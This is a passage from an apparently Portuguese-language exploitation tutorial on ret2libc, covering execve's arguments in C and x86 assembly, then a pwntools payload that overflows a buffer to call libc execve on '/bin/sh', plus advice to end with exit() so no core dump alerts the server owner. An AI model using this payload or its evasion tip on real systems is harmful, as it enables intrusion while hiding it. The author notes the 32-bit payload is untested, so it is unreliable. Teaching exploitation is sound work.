<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
ativando mecanismos de seguran√ßa que alertam o dono do servidor!</p>
<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
programa finalize silenciosamente!</p>
<p>Alem disso, existe mais uma diferen√ßa, <code>execve</code> recebe 3 argumentos:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  execve(&quot;./blablabla&quot;, NULL, NULL);
  return 1;
}
</code></pre>
<p>O primeiro: programa a ser executado</p>
<p>O segundo: argv (poder√≠amos passar <code>-p</code> para <code>sh</code> manter os privil√©gios)</p>
<p>O terceiro: envp (environment vars)</p>
<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
<p>Em 64 bits precisar√≠amos de m√∫ltiplos gadgets para salvar um em cada register</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
</code></pre>
<p>Caso voce queira usar argv:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, NULL);
  return 1;
}
</code></pre>
<pre><code class="language-x86asm">.LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, envp);
  return 1;
}}
</code></pre>
<pre><code class="language-x86asm">..LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;env1&quot;
.LC3:
        .string &quot;env2&quot;
.LC4:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>Bem, agora que voce voltou de ficar brincando com a fun√ß√£o, vamos voltar a pratica:</p>
<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
</code></pre>
<p>Os argumentos est√£o sendo passados conforme conven√ß√£o... mas eu nao posso garantir!</p>
<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, pregui√ßa hehehe :/</p>
<blockquote>
<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima t√©cnica (<code>mprotect</code>)
sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
</blockquote>
<a class="header" href="print.html#mprotect--ret2shellcode-todo" id="mprotect--ret2shellcode-todo"><h2>Mprotect() + ret2shellcode (~TODO~)</h2></a>
<a class="header" href="print.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
<a class="header" href="print.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
fra√ß√£o das fun√ß√µes presentes, pois somente as que sao originalmente usadas
pelo programa sao linkadas!</p>
<a class="header" href="print.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
potencial do libc. Porem caso o computador possua ASLR ligado, sera
necess√°rio primeiro encontrar o endere√ßo aleat√≥rio do libc (libc-leak), ou
executar o exploit em loop ate voce dar sorte (vi√°vel somente em
computadores 32 bits).</p>

                </div>

                <!-- Mobile navigation buttons -->
                

                

            </div>

            

            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        
    <script type="text/javascript">
        var socket = new WebSocket("ws://localhost:3001");
        socket.onmessage = function (event) {
            if (event.data === "reload") {
                socket.close();
                location.reload(true); // force reload from server (not from cache)
            }
        };

        window.onbeforeunload = function() {
            socket.close();
        }
    </script>


        

        

        
        <script>
            $(document).ready(function() {
                window.print();
            })
        </script>
        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
